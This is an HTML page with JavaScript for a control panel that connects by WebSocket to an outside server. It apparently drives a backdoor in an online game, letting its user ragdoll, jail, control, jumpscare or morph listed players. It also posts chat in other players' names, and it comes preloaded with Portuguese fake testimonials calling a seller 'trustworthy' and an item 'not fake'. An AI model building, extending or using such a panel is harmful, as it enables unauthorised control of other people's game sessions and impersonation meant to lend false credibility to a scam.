<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Pxl4r1z3d Panel</title>

<style>
body {
  margin:0;
  background:#f5f5f5;
  font-family:sans-serif;
  display:flex;
  justify-content:center;
  padding:20px;
}

.panel {
  width:400px;
  background:white;
  border-radius:12px;
  box-shadow:0 5px 20px rgba(0,0,0,0.1);
  overflow:hidden;
}

.header {
  padding:12px;
  background:#111;
  color:white;
  display:flex;
  justify-content:space-between;
}

.section {
  padding:12px;
  border-bottom:1px solid #eee;
}

.title {
  font-size:12px;
  color:#777;
  margin-bottom:6px;
}

input {
  width:100%;
  padding:8px;
  margin-bottom:6px;
  border:1px solid #ddd;
  border-radius:6px;
}

.btn {
  background:#111;
  color:white;
  padding:8px;
  text-align:center;
  border-radius:6px;
  cursor:pointer;
  margin-top:5px;
}

.btn:hover {
  background:#333;
}

.players {
  max-height:140px;
  overflow:auto;
}

.player {
  padding:6px;
  border-radius:6px;
  border:1px solid #eee;
  margin-bottom:4px;
  cursor:pointer;
}

.player:hover {
  background:#f0f0f0;
}

/* mensagens prontas */
.msgs {
  display:flex;
  flex-direction:column;
  gap:5px;
}

.msg {
  padding:6px;
  border-radius:6px;
  border:1px solid #ddd;
  cursor:pointer;
  font-size:12px;
}

.msg:hover {
  background:#eee;
}
</style>
</head>

<body>

<div class="panel">

<div class="header">
  <span>Pxl4r1z3d Panel</span>
  <span id="status">OFF</span>
</div>

<!-- PLAYERS -->
<div class="section">
  <div class="title">PLAYERS</div>
  <div id="players" class="players"></div>
  <div class="btn" onclick="refresh()">Refresh</div>
</div>

<!-- CHAT -->
<div class="section">
  <div class="title">CHAT</div>

  <input id="name" placeholder="Player Name">
  <input id="msg" placeholder="Message">

  <div class="btn" onclick="sendChat()">Send</div>
</div>

<!-- MENSAGENS PRONTAS -->
<div class="section">
  <div class="title">QUICK MESSAGES</div>

  <div class="msgs" id="quickMsgs"></div>
</div>

<!-- ACTIONS -->
<div class="section">
  <div class="title">ACTIONS</div>

  <div class="btn" onclick="send('Ragdoll')">Ragdoll</div>
  <div class="btn" onclick="send('Control')">Control</div>
  <div class="btn" onclick="send('Jail')">Jail</div>
  <div class="btn" onclick="send('Jumpscr')">Jumpscr</div>
  <div class="btn" onclick="send('Balloon')">Balloon</div>
  <div class="btn" onclick="send('Inverse')">Inverse</div>
  <div class="btn" onclick="send('Morph')">Morph</div>
</div>

</div>

<script>
let ws;

const playersBox = document.getElementById("players");
const statusEl = document.getElementById("status");
const quickBox = document.getElementById("quickMsgs");

// 🔥 SUAS MENSAGENS
const messages = [
"Oloko Mn chegou Msm achei que era Faike",
"Muito Confiavel mn!!",
"Mn , ja que chegou Pss testa??",
"Obrigado rodrigues Te amo Mn Continue sendo confiavell",
"Pessoal chegou Msm! AChei que era fake , posso testar Mn?",
"Mdsssss recebi mesmooo , vou testar para o Pessoal da laive ver que nao e fake"
];

// 🔥 RENDER MENSAGENS
messages.forEach(m=>{
  const el = document.createElement("div");
  el.className = "msg";
  el.textContent = m;

  el.onclick = ()=>{
    document.getElementById("msg").value = m;
  };

  quickBox.appendChild(el);
});

// 🔥 CONEXÃO
function connect(){
  ws = new WebSocket("wss://luarmor-ws.onrender.com/ws");

  ws.onopen = ()=>{
    statusEl.textContent = "ONLINE";

    ws.send(JSON.stringify({
      type:"register",
      client:"site"
    }));
  };

  ws.onclose = ()=>{
    statusEl.textContent = "OFF";
    setTimeout(connect,2000);
  };

  ws.onmessage = (e)=>{
    try{
      const data = JSON.parse(e.data);

      if(data.type === "players"){
        renderPlayers(data.list);
      }

    }catch{}
  };
}

// 🔥 PLAYERS
function renderPlayers(list){
  playersBox.innerHTML = "";

  list.forEach(p=>{
    const el = document.createElement("div");
    el.className = "player";
    el.textContent = p;

    el.onclick = ()=>{
      document.getElementById("name").value = p;
      navigator.clipboard?.writeText(p);
    };

    playersBox.appendChild(el);
  });
}

// 🔥 SEND
function send(name){
  if(ws.readyState === 1){
    ws.send(JSON.stringify({button:name}));
  }
}

// 🔥 CHAT
function sendChat(){
  const player = document.getElementById("name").value;
  const msg = document.getElementById("msg").value;

  if(!player || !msg) return;

  ws.send(JSON.stringify({
    type:"chat",
    player:player,
    message:msg,
    id: Date.now()+"_"+Math.random()
  }));
}

// 🔥 REFRESH
function refresh(){
  ws.send(JSON.stringify({type:"refresh"}));
}

connect();
</script>

</body>
</html>
